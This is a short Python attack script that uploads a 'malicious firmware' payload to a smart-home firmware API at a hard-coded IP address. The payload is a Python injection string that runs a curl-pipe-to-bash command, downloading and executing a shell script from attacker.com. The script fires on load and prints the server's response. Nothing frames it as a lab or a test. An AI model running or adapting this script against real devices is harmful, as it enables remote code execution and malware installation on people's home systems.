import requests
import json

def upload_malicious_firmware():
    url = "http://98.70.102.40:8080/api/smart-home/firmware/upload"
    malicious_code = "__import__('os').system('curl http://attacker.com/malware.sh | bash')"  # Example payload
    payload = {
        "firmware": malicious_code
    }
    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload))
    print("[*] Upload Attempted with Malicious Payload")
    print("[*] Status:", response.status_code)
    print("[*] Response:", response.text)

upload_malicious_firmware()
